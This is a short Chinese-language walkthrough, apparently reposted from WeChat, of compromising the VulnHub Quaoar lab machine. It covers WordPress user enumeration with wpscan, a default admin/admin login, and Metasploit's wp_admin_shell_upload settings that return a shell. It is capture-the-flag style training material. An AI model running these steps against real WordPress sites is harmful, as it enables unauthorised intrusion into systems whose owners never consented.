# 一个WordPress漏洞利用

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650744906&idx=1&sn=4d308b083b2f75cd7afc5663adef740a&chksm=8714894ab063005cff9f5bcf9683789bc10d2c7f31663079d1960c936464b40990bea750c01b&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650744906&idx=1&sn=4d308b083b2f75cd7afc5663adef740a&chksm=8714894ab063005cff9f5bcf9683789bc10d2c7f31663079d1960c936464b40990bea750c01b&scene=27#wechat_redirect)

vulnhub里有一个靶机Quaoar提供了一个WordPress漏洞利用，很有意思，本周末实践了一下，

下载地址https://download.vulnhub.com/hackfest2016/Quaoar.ova，

还是首先在局域网内找到这个靶机，家用宽带环境，基本都是平板和手机，看到开http和ssh的肯定就是它了，

![](../Images/0690bae02ac7bf958697ca3085e8eb16.png)

反正详细服务信息对漏洞利用也没啥用，就不扫了，

访问一下页面看看，

![](../Images/ef8fffb62ae0aeeafb188172a73d343d.png)

尝试访问robots文件，还真有，

![](../Images/ca1af3c3669451f3276c5de10aa15fc3.png)

那这个渗透方向就确定了，WordPress，

先访问确认一下url，

![](../Images/796e59e27059339f6ecee9cf759843dc.png)

用wpscan扫一下用户，

wpscan --url http://192.168.128.102/wordpress –-enumerate u，

Kali自带的版本有问题，一直更新数据库，

![](../Images/99a74272dc6aa5c0849f4318f65beb58.png)

搞个ubuntu自行安装wpscan也一样，就是给你更新数据库，不往下走，

咋整呢，试试docker吧，  
docker pull wpscanteam/wpscan，

docker run -it --rm wpscanteam/wpscan --url http://192.168.128.102/wordpress --enumerate u，

这就把用户扫出来了，

![](../Images/11a71a25ef80529ffdae14a392683e8b.png)

wpscan这软件做的真差，竟然都不支持默认爆破密码，然后这个docker版本你给指定密码列表文件还不认，没办法，以后再研究安装个正常的wpscan再搞吧，目前怎么办呢，就假设弱口令吧，admin的密码安装完就没改过，还是admin，

登录一下还真是，  

![](../Images/62ba36b0092cd8252efec406c7370e0c.png)

那这就好办了，上Kali，上metasploit，  

use exploit/unix/webapp/wp\_admin\_shell\_upload，

set RHOST 192.168.128.102，

set TARGETURI /wordpress，

set USERNAME admin，

set PASSWORD admin，

exploit，

![](../Images/9ee6feabeffad8ab13501c162eb358e3.png)

看见没，shell这就过来了，

WordPress这啥情况，就一个弱口令，shell就被拿走了，

以后再实践提权。
